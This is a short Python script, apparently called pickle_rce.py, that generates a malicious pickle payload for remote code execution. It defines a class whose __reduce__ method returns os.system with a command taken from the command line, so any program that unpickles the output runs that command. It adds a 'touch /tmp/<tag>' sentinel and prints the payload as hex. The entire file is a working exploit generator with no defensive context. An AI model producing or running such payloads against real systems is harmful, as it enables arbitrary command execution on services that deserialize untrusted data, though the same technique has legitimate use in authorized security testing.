import pickle
import os
import sys

class Pwn:
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))

def main():
    if len(sys.argv) != 3:
        sys.stderr.write("usage: pickle_rce.py <out-tag> <command>\n")
        sys.exit(2)
    cmd = sys.argv[2]
    tag = sys.argv[1]
    payload = pickle.dumps(Pwn(cmd))
    sentinel = f"/tmp/{tag}"
    cmd_with_tag = f"{cmd} && touch {sentinel}"
    payload2 = pickle.dumps(Pwn(cmd_with_tag))
    sys.stdout.write(payload2.hex())

if __name__ == "__main__":
    main()
